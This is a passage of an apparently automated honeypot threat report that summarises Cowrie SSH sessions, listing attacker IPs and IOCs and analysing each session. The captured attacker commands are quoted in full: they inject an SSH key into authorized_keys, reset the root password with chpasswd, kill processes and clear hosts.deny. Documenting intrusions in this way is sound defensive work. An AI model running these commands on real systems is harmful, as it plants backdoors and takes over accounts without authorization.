**Indicators of Compromise (IOCs):**
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "cockpit\naVSPkFmWVelx\naVSPkFmWVelx"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "cockpit\naVSPkFmWVelx\naVSPkFmWVelx\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a9a0e273f593...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 112.216.120.67

#### Analysis

**Attack Type:** Backdoor installation (credential compromise)

**Objective:** Gain remote access via SSH with a new key and elevate privileges by resetting the root password; gather system information for further exploitation.

**Techniques Used:**
- **SSH Key Injection** – `echo … > .ssh/authorized_keys` to add an RSA public key.
- **Root Password Reset** – `chpasswd` to set a new root password (`root:V3thfIDBjMVp`).
- **Process Hiding / Cleanup** – `pkill -9` on various scripts and `sleep`, plus deletion of temporary files.
- **System Reconnaissance** – commands querying CPU, memory, OS, uptime, crontab, etc.

**Indicators of Compromise (IOCs):**
- Attacker IP: 112.216.120.67
- RSA public key string in `.ssh/authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`)
- File paths modified: `/etc/hosts.deny`, `.ssh/authorized_keys`
- Root password set to `V3thfIDBjMVp`

**Threat Level:** **High** – root credential change and SSH backdoor pose significant risk.

**Brief Summary:** The attacker injected an SSH key, reset the root password, and performed system reconnaissance, effectively establishing a persistent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:V3thfIDBjMVp"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 33c5f9424233...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.201.208

#### Analysis

**Attack Type:**  
Backdoor installation / credential compromise (SSH key injection + root password alteration)

**Objective:**  
Gain remote access to the system via SSH and elevate privileges by changing the root password.

**Techniques & Tools Used:**
- Creation of a `.ssh` directory, setting restrictive permissions (`chmod -R go= ~/.ssh`)
- Injection of an RSA public key into `authorized_keys`
- Attempting to change the root password with `chpasswd`
- System reconnaissance commands (CPU info, memory usage, OS details, etc.)

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.201.208**  
- SSH public key string in `.ssh/authorized_keys`  
- Root password set to **Cp5OpvjJH3Dg** (via `echo "root:Cp5OpvjJH3Dg"|chpasswd|bash`)  
- File path: `/home/.ssh/authorized_keys`

**Threat Level:** Medium‑High – the attacker is attempting privileged access and has injected a key for persistent remote control.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `authorized_keys` file, attempted to change the root password, and performed system reconnaissance. This indicates a backdoor installation aimed at gaining remote administrative access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Cp5OpvjJH3Dg"|chpasswd|bash
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
w
... (+8 more)
```

---

### Pattern: 67378f2f68e5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 112.216.120.67

#### Analysis

**Attack Type:**  
Backdoor installation with SSH key injection + system reconnaissance

**Objective:**  
Gain persistent, privileged (root) access on the host by adding a malicious SSH key and changing the root password.

**Techniques & Tools:**
- `chattr -ia` / `lockr` to set immutable attributes on `.ssh`
- Injection of an arbitrary RSA public key into `authorized_keys`
- `chpasswd` to overwrite the root password
- System‑info gathering (`proc/cpuinfo`, `uname`, `top`, etc.) for reconnaissance
- Removal/termination of temporary scripts and processes (`rm -rf /tmp/*`, `pkill -9`)

**Indicators of Compromise (IOCs):**
- Attacker IP: **112.216.120.67**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:u2FFMUYTvoe4"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c3c1898641cf...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.162.232

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)  
**Objective:** Gain remote SSH access to the honeypot host.  
**Techniques:**  
- Manipulated `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) and injected a random RSA public key into `authorized_keys`.  
- Adjusted permissions (`chmod -R go= ~/.ssh`).  
- Attempted password change via `passwd` (failed).  
- Executed system‑info commands for reconnaissance (CPU, memory, disk usage, uname, crontab, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.162.232** (Singapore)  
- RSA public key string inserted into `authorized_keys` (e.g., `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`).  
- File path: `~/.ssh/authorized_keys`.  

**Threat Level:** **High** – the attacker successfully created a backdoor and performed reconnaissance, indicating potential for unauthorized access.  

**Brief Summary:** The attacker injected an arbitrary SSH key into the honeypot’s `.ssh` directory to establish remote access, while gathering system information for further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "xg1234\nse3u74l4692O\nse3u74l4692O"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "xg1234\nse3u74l4692O\nse3u74l4692O\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+11 more)
```

---

### Pattern: da195526c699...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.218.138

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the host (root login)  
**Techniques:**  
- `chattr -ia` and `lockr -ia` to lock `.ssh` directory attributes  
- Removal/creation of `.ssh` directory, writing a public SSH key to `authorized_keys`  
- Changing root password with `chpasswd` and launching a shell (`bash`)  
- System reconnaissance (CPU info, uname, lscpu, disk usage)  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 45.78.218.138 (Singapore)  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGT

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:QNWomXWVGRdp"|chpasswd|bash
top
uname
uname -a
whoami
lscpu | grep Model
... (+1 more)
```

---

### Pattern: 1651935ac99b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 112.216.120.67

#### Analysis

**Attack Type:** Backdoor installation / remote access exploitation  
**Objective:** Gain persistent SSH access to the host by injecting a malicious public‑key into `~/.ssh/authorized_keys` and resetting the root password.  
**Techniques:**  
- SSH key injection (`echo … > .ssh/authorized_keys`)  
- Root password reset (`chpasswd` with “root:CeLIbHmJnJnN”)  
- Process cleanup & kill (`pkill -9`, `rm -rf /tmp/...`)  
- System reconnaissance (CPU, memory, disk, uname, etc.)  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 112.216.120.67 (South Korea)  
- Public‑key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `CeLIbHmJnJnN`  

**Threat Level:** **High** – the attacker has established a persistent backdoor with root access, enabling full control of the system.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish remote access, while gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:CeLIbHmJnJnN"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 0a96b6838633...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 66.116.199.234

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection combined with system reconnaissance.

**Objective:**  
The attacker aims to gain persistent remote access (via SSH) and gather host information for further exploitation or monitoring.

**Techniques & Tools:**
- `chattr -ia` / `lockr -ia` – custom commands likely used to lock the `.ssh` directory.
- Creation of a new `.ssh` directory, insertion of an RSA public key into `authorized_keys`, and setting restrictive permissions (`chmod -R go= ~/.ssh`).
- Use of `passwd` with echoed passwords to attempt password changes (possibly for root or user accounts).
- System information gathering: CPU info (`/proc/cpuinfo`), memory usage (`free -m`), disk space (`df -h`), OS details (`uname`, `whoami`, `lscpu`).

**Indicators of Compromise (IOCs):**
- **IP:** 66.116.199.234
- **RSA Public Key String**:  
```
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
```
- **File Path:** `~/.ssh/authorized_keys`

**Threat Level:** Medium – the attacker demonstrates moderate sophistication (SSH backdoor, system reconnaissance) but lacks evidence of large-scale exploitation or malware deployment.

**Brief Summary:**  
The session shows an attacker injecting a public SSH key into the honeypot’s `authorized_keys` file to establish remote access, while simultaneously collecting host system information for potential further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qaz@WSX\n5X1zpNE4ZLhI\n5X1zpNE4ZLhI"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qaz@WSX\n5X1zpNE4ZLhI\n5X1zpNE4ZLhI\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a8f9d2f958ff...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 96.44.159.120

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection (remote access establishment)

**Objective:**  
Gain persistent remote login capability on the target machine by creating an authorized SSH key and attempting to change the local user’s password.

**Techniques & Tools Used:**
- `chattr`, `lockr` – file attribute manipulation to hide or lock files
- `chmod -R go= ~/.ssh` – restrictive permissions on SSH directory
- `echo … > .ssh/authorized_keys` – injection of a custom RSA public key
- `passwd` – attempts to set a new UNIX password
- System information commands (`cat /proc/cpuinfo`, `free`, `uname`, `top`, etc.) for reconnaissance

**Indicators of Compromise (IOCs):**
- Attacker IP: **96.44.159.120**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File modifications: `.ssh`, `authorized_keys`

**Threat Level:** Medium – moderate sophistication with direct remote access capability, but no payload download or cryptomining activity.

**Brief Summary:**  
The attacker injected a custom SSH key into the target’s authorized keys and attempted to change the local user password while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qazXSW@\n1f6hW0HmoqYl\n1f6hW0HmoqYl"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qazXSW@\n1f6hW0HmoqYl\n1f6hW0HmoqYl\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 3b2ec3813256...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 96.44.159.120

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise – the attacker is attempting to gain persistent remote access by injecting an SSH key and changing the root password.

**2. Objective:**  
Establish a secure, long‑term foothold on the system: create an authorized SSH key for future logins and elevate privileges by resetting the root password.

**3. Techniques & Tools Used:**  
- `chattr -ia` to lock `.ssh` directory (prevent tampering).  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `echo "root:2yEUT9MejNdF"|chpasswd|bash` to set the root password.  
- Process killing (`pkill -9`) and file cleanup to hide activity.  
- System reconnaissance commands (CPU info, memory usage, uptime, etc.) for profiling.

**4. Indicators of Compromise (IOCs):**  
- Attacker IP: **96.44.159.120**  
- RSA public key string in `authorized_keys` (the long base‑64 string).  
- Root password hash (not directly visible but the password “2yEUT9MejNdF” is used).  
- File paths targeted: `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  

**5. Threat Level:** **High** – root credential alteration and SSH key injection provide full control, potentially enabling further exploitation.

**6. Brief Summary:**  
The attacker injected an SSH key into the system’s `.ssh` directory, locked it, set a new root password, and performed cleanup to conceal activity, establishing a persistent backdoor for future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:2yEUT9MejNdF"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: de35c282f23c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 187.174.238.116

#### Analysis

**1. Attack Type:**  
Backdoor installation / credential compromise – the attacker injects an SSH key and attempts to create or modify user credentials.

**2. Objective:**  
Gain remote access to the honeypot (and potentially any real host) via SSH, and establish a known user/password for future exploitation.

**3. Techniques & Tools Used:**
- `chattr -ia`, `lockr` – lock files to prevent tampering.
- `mkdir .ssh; echo … > ~/.ssh/authorized_keys` – inject malicious SSH public key.
- `chmod -R go= ~/.ssh` – restrict permissions.
- `passwd` with echoed password input – attempt to set a new user/password (user8).
- System info commands (`cat /proc/cpuinfo`, `free -m`, `uname`, etc.) for reconnaissance.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **187.174.238.116**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```

**5. Threat Level:** **High** – the attacker successfully installs a backdoor and attempts to create a known user/password, enabling persistent remote access.

**6. Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `.ssh` directory, attempted to set a new user with a known password, and gathered system information for reconnaissance, indicating a high‑risk backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "user8\nAQXW6Hoq1yfj\nAQXW6Hoq1yfj"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "user8\nAQXW6Hoq1yfj\nAQXW6Hoq1yfj\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 2cf02e3d0b7c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 66.116.199.234

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection (with attempts to manipulate user credentials).  
**Objective:** Gain remote SSH access to the host and potentially create or alter a local user account.  
**Techniques:**  
- `chattr`, `lockr` to lock `.ssh` directory;  
- `chmod -R go= ~/.ssh` to restrict permissions;  
- Echoing a public‑key into `.ssh/authorized_keys`;  
- Using `passwd` with echoed input to set passwords;  
- System‑info commands (`cat /proc/cpuinfo`, `free -m`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **66.116.199.234** (India).  
- Public SSH key string in `.ssh/authorized_keys`:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File path: `.ssh/authorized_keys`.  

**Threat Level:** **Medium‑High** – the attacker successfully injected a remote access key and attempted to alter credentials, indicating potential persistence and exploitation.  

**Brief Summary:** The attacker used Cowrie to inject an SSH public key into `authorized_keys`, attempted password changes via `passwd`, and performed system reconnaissance, suggesting a backdoor installation aimed at gaining remote control of the host.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1qazXSW@\n2PdwSgR7gbuY\n2PdwSgR7gbuY"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1qazXSW@\n2PdwSgR7gbuY\n2PdwSgR7gbuY\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 66d110e104f8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 83.168.69.143

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent SSH access and elevate privileges (root).  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys` (`chattr`, `lockr`).  
- Changed root password via `echo "root:ca4COA0VS6qu"|chpasswd`.  
- Removed temporary scripts and killed related processes.  
- Executed system‑info commands for reconnaissance (CPU, memory, disk).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **83.168.69.143** (Poland)  
- Public key string in `authorized_keys`:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- Root password hash: **ca4COA0VS6qu** (hashed via `chpasswd`).  

**Threat Level:** Medium‑High – attacker has root access and a persistent SSH backdoor.  
**Brief Summary:** The attacker injected an SSH key, changed the root password, and removed temporary scripts to establish a persistent backdoor on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ca4COA0VS6qu"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: b495c57205b1...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.201.208

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote SSH access to the honeypot host.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) to hide or lock files.  
- Creation of a new RSA public key in `authorized_keys`.  
- Setting restrictive permissions on `.ssh`.  
- Attempting to change local user password via `passwd`.  
- System reconnaissance (CPU, memory, disk, uptime, crontab).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.201.208** (Singapore)  
- RSA key string in `/ssh/authorized_keys`  
- Commands: `lockr -ia .ssh`, `chattr -ia .ssh`.  

**Threat Level:** Medium – the attacker has injected a backdoor but no evidence of further exploitation or payload download.  

**Brief Summary:** The session shows an attacker attempting to install an SSH backdoor by creating a new RSA key in `.ssh/authorized_keys` and gathering system information, likely for future remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "user8\nF9laA9vE7JF8\nF9laA9vE7JF8"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "user8\nF9laA9vE7JF8\nF9laA9vE7JF8\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 5ffacd070f5d...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.36.107.103

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
